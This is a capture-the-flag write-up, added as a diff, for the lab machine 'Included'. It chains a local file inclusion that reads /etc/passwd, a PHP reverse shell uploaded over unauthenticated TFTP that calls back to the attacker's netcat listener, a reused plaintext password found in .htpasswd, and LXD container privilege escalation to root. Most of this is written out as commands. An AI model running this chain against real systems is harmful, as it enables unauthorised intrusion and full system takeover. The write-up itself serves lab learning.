@@ -1,0 +1,185 @@
+
+Included Box: Vulnerability - local file inclusion, LXD exploit, misconfigured TFTP server
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+| http-title: Site doesn't have a title (text/html; charset=UTF-8).
+|_Requested resource was http://10.129.95.185/?file=home.php
+
+I went to the website, the home page had “http://10.129.95.185/?file=home.php#” 
+Let’s try directory enumeration
+gobuster dir -u http://10.129.95.185/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt 
+
+Starting gobuster in directory enumeration mode
+===============================================================
+/images               (Status: 301) [Size: 315] [--> http://10.129.95.185/images/]
+/fonts                (Status: 301) [Size: 314] [--> http://10.129.95.185/fonts/]
+Progress: 87664 / 87665 (100.00%)
+
+
+Let’s also try burp suite, I’ve reloaded the homepage and got this request intercepted:
+GET /?file=home.php HTTP/1.1
+Host: 10.129.95.185
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+DNT: 1
+Connection: close
+Upgrade-Insecure-Requests: 1
+Sec-GPC: 1
+
+I sent this over to the repeater, here’s the request:
+GET /?file=admin.php HTTP/1.1
+Host: 10.129.95.185
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+DNT: 1
+Connection: close
+Upgrade-Insecure-Requests: 1
+Sec-GPC: 1
+Response:
+HTTP/1.1 200 OK
+Date: Mon, 01 Jul 2024 00:33:23 GMT
+Server: Apache/2.4.29 (Ubuntu)
+Content-Length: 0
+Connection: close
+Content-Type: text/html; charset=UTF-8
+
+
+I guess we can tell that the machine isn’t really validating the GET http requests?
+Local File Inclusion vulnerability from HTTP get ?file=
+GET /?file=/etc/passwd HTTP/1.1
+Host: 10.129.95.185
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+DNT: 1
+Connection: close
+Upgrade-Insecure-Requests: 1
+Sec-GPC: 1
+Response:
+HTTP/1.1 200 OK
+Date: Mon, 01 Jul 2024 00:39:28 GMT
+Server: Apache/2.4.29 (Ubuntu)
+Vary: Accept-Encoding
+Content-Length: 1575
+Connection: close
+Content-Type: text/html; charset=UTF-8
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+lxd:x:105:65534::/var/lib/lxd/:/bin/false
+uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
+dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:109:1::/var/cache/pollinate:/bin/false
+mike:x:1000:1000:mike:/home/mike:/bin/bash
+tftp:x:110:113:tftp daemon,,,:/var/lib/tftpboot:/usr/sbin/nologin
+
+We notice: “tftp:x:110:113:tftp daemon,,,:/var/lib/tftpboot:/usr/sbin/nologin”
+nmap -sV -sC -p- --min-rate=5000 -Pn -sU 10.129.95.185
+-sU flag allows us to see that tftp server is also running on UDP
+TFTP server is open on port 69 and it usually is unauthenticated login
+
+We can use this reverse shell php file https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php 
+nano shell.php
+Contents of the file, we modified only the below:
+$ip = “10.10.14.6”;
+$port = “4444”;
+
+tftp 10.129.95.185
+put shell.php
+
+
+Start netcat listener:
+nc -lvnp 4444
+
+We noticed from before the credentials from HTTP response:
+“tftp:x:110:113:tftp daemon,,,:/var/lib/tftpboot:/usr/sbin/nologin”
+-We can assume the shell.php lies within the directory /var/lib/tftpboot
+
+Curl this so the http server reaches over to use our shell.php
+curl ‘http://10.129.95.185/?file=/var/lib/tftpboot/shell.php’
+
+On our netcat listener, we have the connection. Let’s stabilize it:
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+
+
+Lateral movement:
+Let’s try to find text files for a flag:
+find . -name "*.txt" 2>/dev/null
+“2>/dev/null” will sent permission denied output to trash (/dev/null) so its better output
+
+./home/mike/user.txt, however we don’t have permissions to open or cat
+
+The web-related files are usually stored in the /var/www/html folder
+
+Once to the above, we see two HIDDEN files which can we found via
+ls -a
+cat .htpasswd
+
+Which contained contents:
+www-data@included:/var/www/html$ cat .htpasswd
+cat .htpasswd
+mike:Sheffield19
+
+Let’s try a login to mike:
+su mike
+
+It works, now we have the user.flag:
+a56ef91d70cfbf2cdb8f454c006935a1
+
+
+Privilege escalation:
+mike@included:~$ id
+id
+uid=1000(mike) gid=1000(mike) groups=1000(mike),108(lxd)
+mike@included:~$ groups
+groups
+mike lxd
+
+Lxd is an exploitable group that can escalate privileges, mike is in lxd so this is perfect:
+Use this guide to assist
+https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation 
+
+Now that we have created the two files to transfer, we need to make our reverse shell get this from our hosted HTTP server on port 8000
+python3 -m http.server 8000
+
+On reverse shell:
+wget http://10.10.14.6:8000/lxd.tar.xz
+wget http://10.10.14.6:8000/rootfs.squashfs
+lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
+lxc image list
+lxc init alpine privesc -c security.privileged=true
+lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
+lxc start privesc
+lxc exec privesc /bin/sh
+whoami
+
+Now we have root access
